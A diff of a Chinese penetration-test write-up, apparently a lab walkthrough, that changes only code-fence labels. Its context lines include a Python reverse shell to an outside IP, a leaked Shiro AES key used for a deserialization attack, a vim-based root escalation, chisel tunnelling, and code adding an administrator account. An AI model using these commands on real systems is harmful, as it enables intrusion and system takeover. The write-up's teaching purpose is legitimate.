@@ -66,7 +66,7 @@ start vulscan
 
 发现存在 heapdump 泄露，使用 [whwlsfb/JDumpSpider: HeapDump 敏感信息提取工具](https://github.com/whwlsfb/JDumpSpider) 进行分析
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ java -jar ~/tools/JDumpSpider-1.1-SNAPSHOT-full.jar ~/tmp/heapdump
 ===========================================
@@ -85,13 +85,13 @@ algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES
 
 利用 CommonsBeanutils1 链子进行攻击，直接利用环境已有的 pytohn3 反弹 shell
 
-```shell
+```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.129.29.180",9111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
 成功收到回连
 
-```shell
+```bash
 (remote) app@web01:/home/app$ whoami
 app
 ```
@@ -130,7 +130,7 @@ Vulnerable to CVE-2021-3560
 
 最终成功得到root权限
 
-```shell
+```bash
 (remote) app@web01:/tmp$ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 (remote) root@web01:/tmp$ whoami
 root
@@ -175,7 +175,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 使用fscan进行扫描
 
-```shell
+```bash
 start infoscan
 trying RunIcmp2
 The current user permissions unable to send icmp packets
@@ -211,7 +211,7 @@ start vulscan
 
 建立内网代理
 
-```shell
+```bash
 # vps
 root@jmt-projekt:~# ./tools/chisel_1.10.1/chisel_1.10.1_linux_amd64 server -p 9111 --reverse
 2025/01/31 22:29:55 server: Reverse tunnelling enabled
@@ -240,7 +240,7 @@ Runtime.getRuntime().exec("net localgroup Administrators randark /add");
 
 编译jar包
 
-```shell
+```bash
 PS D:\_Exps\yaml-payload> javac src/artsploit/AwesomeScriptEngineFactory.java
 PS D:\_Exps\yaml-payload> jar -cvf exp.jar -C src/ .         
 已添加清单
